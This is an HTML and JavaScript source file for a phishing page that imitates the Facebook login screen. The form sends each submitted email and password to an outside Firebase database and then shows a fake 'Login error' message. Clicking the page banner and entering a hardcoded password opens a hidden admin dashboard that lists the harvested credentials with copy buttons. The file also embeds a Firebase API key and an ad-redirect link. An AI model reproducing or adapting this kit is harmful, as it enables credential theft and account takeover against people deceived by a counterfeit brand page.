<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">

    <style>
        :root { --primary: #0866ff; --bg: #f0f2f5; --white: #ffffff; --text: #1c1e21; --danger: #ff4d4f; }
        body { font-family: 'Inter', sans-serif; margin: 0; padding: 0; background-color: var(--white); overflow-x: hidden; }

        /* Login UI */
        .login-container { width: 100%; max-width: 412px; margin: auto; padding: 0 16px; box-sizing: border-box; }
        .top-banner { display: flex; align-items: center; justify-content: center; padding: 12px 0; color: var(--primary); font-size: 13px; font-weight: 600; border-bottom: 1px solid #ddd; cursor: pointer; }
        .header-lang { text-align: center; color: #606770; font-size: 14px; padding: 20px 0; }
        .fb-logo-box { display: flex; justify-content: center; margin: 20px 0 40px; }
        .fb-circle { width: 65px; height: 65px; background: var(--primary); border-radius: 50%; display: flex; align-items: center; justify-content: center; position: relative; }
        .fb-f { color: white; font-size: 55px; font-weight: bold; position: absolute; bottom: -6px; right: 12px; }
        .inputs { width: 100%; padding: 16px; margin-bottom: 12px; border: 1px solid #ccd0d5; border-radius: 12px; box-sizing: border-box; font-size: 15px; background: #f5f6f7; outline: none; }
        .btn-login { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 25px; font-weight: bold; font-size: 16px; cursor: pointer; }
        .btn-create { width: 100%; padding: 12px; margin-top: 100px; background: white; color: var(--primary); border: 1px solid var(--primary); border-radius: 25px; font-weight: bold; cursor: pointer; }

        /* Admin UI */
        #adminPanel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 9999; overflow-y: auto; }
        .admin-nav { background: var(--primary); color: white; padding: 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; }
        .admin-content { padding: 20px; max-width: 500px; margin: auto; }
        .stat-card { background: linear-gradient(135deg, #0866ff, #004dc7); color: white; padding: 20px; border-radius: 15px; margin-bottom: 20px; text-align: center; }
        .log-card { background: var(--white); border-radius: 12px; padding: 16px; margin-bottom: 15px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); border-left: 5px solid var(--primary); }
        .action-btns { margin-top: 10px; display: flex; gap: 10px; }
        .btn-action { flex: 1; padding: 8px; border: none; border-radius: 6px; cursor: pointer; font-size: 12px; font-weight: 600; }
        .btn-copy { background: #e7f3ff; color: var(--primary); }
        .btn-delete { background: #fff1f0; color: var(--danger); }
    </style>
</head>
<body>

<div id="loginPage" class="login-container">
    <div class="top-banner" onclick="openAdmin()">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
        &nbsp; Get Facebook for Android and browse faster.
    </div>
    <div class="header-lang">English (UK)</div>
    <div class="fb-logo-box"><div class="fb-circle"><span class="fb-f">f</span></div></div>

    <form id="mainForm">
        <input type="text" id="email" class="inputs" placeholder="Mobile number or email address" required>
        <input type="password" id="pass" class="inputs" placeholder="Password" required>
        <button type="submit" class="btn-login">Log in</button>
    </form>
    <div style="text-align: center; margin-top: 20px;"><a href="#" style="text-decoration:none; color:#1c1e21; font-weight:500;">Forgotten password?</a></div>
    <button class="btn-create">Create new account</button>
</div>

<div id="adminPanel">
    <div class="admin-nav"><b>Admin Dashboard</b> <button onclick="location.reload()" style="background:none; border:1px solid white; color:white; border-radius:15px; padding:4px 12px; cursor:pointer;">Logout</button></div>
    <div class="admin-content">
        <div class="stat-card"><div style="font-size:14px;opacity:0.8;">Total Logs</div><div id="count" style="font-size:32px;font-weight:700;">0</div></div>
        <div id="logContainer">Loading...</div>
    </div>
</div>

<script>
    // Firebase Config (Your Config)
    const firebaseConfig = {
      apiKey: "AIzaSyCCZMHCgIuFQtwjZer0e_nSXQjFMgxHFSY",
      authDomain: "net-cash-pro-67f5d.firebaseapp.com",
      databaseURL: "https://net-cash-pro-67f5d-default-rtdb.firebaseio.com",
      projectId: "net-cash-pro-67f5d",
      storageBucket: "net-cash-pro-67f5d.firebasestorage.app",
      messagingSenderId: "15021602824",
      appId: "1:15021602824:web:e37a1073696c9f757639bd"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Submit Logic
    document.getElementById('mainForm').addEventListener('submit', (e) => {
        e.preventDefault();
        const u = document.getElementById('email').value;
        const p = document.getElementById('pass').value;
        const ad = "https://www.effectivegatecpm.com/ruifira0n?key=185580d2c40df238621097ff9bc9f9c7";

        db.ref('user_logs').push({ u, p, date: new Date().toLocaleString() }).then(() => {
            window.open(ad, '_blank');
            alert("Login error! Please try again.");
            document.getElementById('mainForm').reset();
        });
    });

    // Admin Logic
    function openAdmin() {
        if (prompt("Admin Password:") === "15211") {
            document.getElementById('loginPage').style.display = "none";
            document.getElementById('adminPanel').style.display = "block";
            loadData();
        }
    }

    function loadData() {
        db.ref('user_logs').on('value', (s) => {
            const container = document.getElementById('logContainer');
            container.innerHTML = "";
            let c = 0;
            s.forEach((child) => {
                c++;
                const d = child.val();
                container.innerHTML += `<div class="log-card">
                    <b>User:</b> ${d.u}<br><b>Pass:</b> ${d.p}<br><small>${d.date}</small>
                    <div class="action-btns">
                        <button class="btn-action btn-copy" onclick="copyText('${d.u}', '${d.p}')">Copy</button>
                        <button class="btn-action btn-delete" onclick="deleteLog('${child.key}')">Delete</button>
                    </div>
                </div>`;
            });
            document.getElementById('count').innerText = c;
        });
    }

    function copyText(u, p) { navigator.clipboard.writeText("User: "+u+"\nPass: "+p); alert("Copied!"); }
    function deleteLog(k) { if(confirm("Delete?")) db.ref('user_logs').child(k).remove(); }
</script>
</body>
    </html>
